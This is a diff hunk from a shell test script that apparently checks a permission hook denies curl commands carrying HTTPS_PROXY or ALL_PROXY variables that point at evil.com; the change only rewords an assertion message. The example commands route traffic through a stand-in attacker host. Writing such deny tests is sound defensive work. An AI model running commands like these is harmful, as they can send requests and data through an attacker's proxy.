@@ -112,7 +112,7 @@ for spec in \
   "HTTPS_PROXY=evil.com:8080 curl http://localhost:4173/|HTTPS_PROXY" \
   "ALL_PROXY=socks5://evil.com curl http://localhost:4173/|ALL_PROXY" ; do
   cmd="${spec%%|*}"; label="${spec##*|}"
-  assert_deny "$H" "$(bp "$cmd")" "R34 $label → DENY" "read as OPTIONS by the runtime"
+  assert_deny "$H" "$(bp "$cmd")" "R34 $label → DENY" "in front of a command"
 done
 
 # --- Calibration: the role's job, and an override pointing IN scope ----
